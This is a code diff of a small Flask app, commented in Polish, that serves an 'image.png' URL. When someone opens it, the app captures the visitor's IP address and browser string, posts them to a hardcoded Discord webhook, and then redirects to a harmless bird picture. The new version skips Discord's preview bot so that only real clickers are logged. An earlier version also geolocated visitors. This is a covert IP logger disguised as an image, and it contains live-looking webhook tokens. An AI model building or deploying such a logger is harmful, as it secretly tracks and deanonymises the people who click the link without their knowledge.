@@ -1,51 +1,43 @@
-import requests
 from flask import Flask, request, redirect
+import requests
 
 app = Flask(__name__)
 
-# Twoje dane z promptu
-DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1466928983496069121/sFGXFac4Ql5ob_-oBlfLQ0w_saOlyGxvAiJ75YjQ6At1weQ4_vGS8HS20fdpQUnejIjK"
-REDIRECT_IMAGE = "https://img.freepik.com/darmowe-wektory/ptak-ilustracja-projektowanie-logo-retro_53876-117215.jpg"
+# Twój aktualny link do webhooka
+WEBHOOK_URL = "https://discord.com/api/webhooks/1336930594799327529/VX0R1leJbv97emxJkz3rKjLKgr5BK6SgoSqcCn_cRc76VepZoxiEpPk3fcTPqgVYlyBi"
 
 @app.route('/image.png')
 def logger():
-    # 1. Pobieranie IP (za proxy/hostingiem)
-    if request.headers.getlist("X-Forwarded-For"):
-        ip = request.headers.getlist("X-Forwarded-For")[0]
-    else:
-        ip = request.remote_addr
+    user_agent = request.headers.get('User-Agent', '')
+    
+    # Ignorujemy bota Discorda, żeby nie wysyłał pustych powiadomień przy wklejaniu linku
+    if "Discordbot" in user_agent:
+        return redirect("https://i.ibb.co/L6M7v9V/ptak.png")
 
-    # 2. Pobieranie szczegółów geolokalizacyjnych przez ip-api
-    geo_data = {}
-    try:
-        geo_res = requests.get(f"http://ip-api.com/json/{ip}?fields=status,message,country,regionName,city,zip,isp,proxy").json()
-        if geo_res["status"] == "success":
-            geo_data = geo_res
-    except Exception as e:
-        print(f"Błąd geo: {e}")
-
-    # 3. Formułowanie wiadomości do Discorda
-    payload = {
+    # Pobieramy IP użytkownika
+    ip = request.headers.get('X-Forwarded-For', request.remote_addr)
+    
+    # Przygotowanie danych do wysłania
+    data = {
         "embeds": [{
-            "title": "🚀 Nowe logowanie z maszyny wirtualnej",
-            "color": 16711680, # Czerwony
+            "title": "🎯 Ktoś kliknął w logger!",
+            "color": 16711680, # Czerwony kolor paska
             "fields": [
-                {"name": "🌐 Adres IP", "value": f"`{ip}`", "inline": True},
-                {"name": "🌍 Kraj/Miasto", "value": f"{geo_data.get('country', 'Nieznany')} / {geo_data.get('city', 'Nieznane')}", "inline": True},
-                {"name": "📍 Region", "value": f"{geo_data.get('regionName', 'Nieznane')}", "inline": True},
-                {"name": "🏢 Dostawca (ISP)", "value": f"{geo_data.get('isp', 'Nieznany')}", "inline": False},
-                {"name": "🛡️ VPN/Proxy?", "value": "TAK" if geo_data.get('proxy') else "NIE", "inline": True},
-                {"name": "📱 Browser/System", "value": f"```{request.headers.get('User-Agent')}```", "inline": False}
+                {"name": "Adres IP", "value": f"`{ip}`", "inline": True},
+                {"name": "Przeglądarka", "value": f"`{user_agent[:100]}...`", "inline": False}
             ],
-            "footer": {"text": "Laboratorium IT - Test Bezpieczeństwa"}
+            "footer": {"text": "Logger System"}
         }]
     }
+    
+    # Wysyłanie na Discorda
+    try:
+        requests.post(WEBHOOK_URL, json=data)
+    except:
+        pass
 
-    # 4. Wysyłka na Discord
-    requests.post(DISCORD_WEBHOOK_URL, json=payload)
-
-    # 5. Przekierowanie do obrazka
-    return redirect(REDIRECT_IMAGE)
+    # Przekierowanie do prawdziwego zdjęcia
+    return redirect("https://i.ibb.co/L6M7v9V/ptak.png")
 
 if __name__ == '__main__':
-    app.run(host='0.0.0.0', port=5000)
+    app.run(port=10000)
